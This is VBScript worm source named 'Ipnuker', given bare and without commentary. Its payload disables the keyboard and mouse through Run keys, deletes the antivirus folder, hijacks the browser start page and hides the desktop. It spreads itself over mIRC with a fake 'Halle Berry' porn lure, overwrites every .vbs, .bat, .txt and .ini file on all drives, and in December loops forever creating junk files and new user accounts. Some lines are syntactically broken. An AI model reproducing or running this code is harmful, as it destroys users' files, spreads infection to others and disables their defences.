'Ipnuker
'Ipnuker

Dim a,b,c,d,e,f,mirc,lastvar,last
set a = createobject("Wscript.Shell")
set b = createobject("Scripting.FileSystemObject")
Set Drives=b.drives
Set Codee = b.opentextfile(wscript.scriptfullname, 1)
IpCode = Codee.readall

a.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableKeyboard", "Rundll32.exe Keyboard,Disable"
a.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableMouse", "Rundll32.exe Mouse,Disable"

If b.FolderExists("C:\Program files\Norton AntiVirus") then
  b.FolderDelete("C:\Program files\Norton AntiVirus")
End If

set c = a.createTextFile("%WINDIR%/Ip.bat")
c.writeline "RUNDLL32 USER32.DLL,SwapMouseButton"
c.close
a.run "%WINDIR%/Ip.bat",vbhide

a.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start_Page", "http://www.ipnuker.com"

a.regWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Ipnuker"

a.regwrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",1,"REG_DWORD"

a.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WindosXp", "Wscript.exe " & b.GetSpecialFolder(0) & Wscript.ScriptFullName

set e=a.createshortcut ("c:\Ipnuker.lnk")
e.targetpath = "notepad.exe"
e.save

Set f = a.CreateShortcut("c:\Ipnuker.lnk")
f.TargetPath = WScript.ScriptFullName
f.Save

If b.FileExists("C:\Mirc\Mirc.ini") Then
MircFolder = "C:\Mirc"
Else
If b.FileExists("C:\Mirc32\Mirc.ini") Then
MircFolder = "C:\Mirc32"
Else
If b.FileExists(c & "\Mirc\Mirc.ini") Then
MircFolder = c & "\Mirc"
End If
End If
End If
If Not MircFolder = "" Then
Set mirc = b.CreateTextFile(MircFolder & "\Script.ini", True)
mirc.WriteLine ("[script]")
mirc.WriteLine ("n5= on 1:JOIN:#:{")
mirc.WriteLine ("n6= /if ( $nick == $me ) { halt }")
mirc.WriteLine ("n7= /msg $nick Halle Berry Porn Pics.")
mirc.WriteLine ("n8= /dcc send -c $nick " & b.GetSpecialFolder(0) & "\Halle Berry.vbs")
mirc.WriteLine ("n9= }")
mirc.Close
Set HideScript = b.GetFile(MircFolder & "\Script.ini")
HideScript.Attributes = 2
End If

'File Infector
Set Drives=b.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive & "\"
End If 
Next 
Function Dosearch(Path)
Set Folder=b.getfolder(path)
Set Files = folder.files 
For Each File in files
If b.GetExtensionName(file.path)="vbs" Or b.GetExtensionName(file.path)="bat" Or b.GetExtensionName(file.path)="txt" Or b.GetExtensionName(file.path)="ini" then
on error resume next
Set dropin = b.createtextfile(file.path, True)
dropin.write IpCode
dropin.Close
End if
Next
Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
Dosearch Subfolder.path 
Next 
End function

If Month(Now) = 12"
set d = a.createTextFile("%WINDIR%/IpUser.bat")
Do
Randomize
lastvar = int(Rnd * 1011)
set last = a.createTextFile("c:\" & lastvar & ".txt")
a.sendkeys "{NUMLOCK}"
last.Writeline " ++++++++++++++++++++++++++++++++++++++++"
last.Writeline "+                                        +"
last.Writeline "+                Ipnuker                 +"
last.Writeline "+                                        +"
last.Writeline " ++++++++++++++++++++++++++++++++++++++++"
a.sendkeys "{SCROLLLOCK}"
last.Close
a.sendkeys "{SCROLLLOCK}"
d.writeline "net user " & lastvar & " /ADD"
d.close
a.run "%WINDIR%/IpUser.bat",vbhide
Loop
End If

'Ipnuker
'Ipnuker










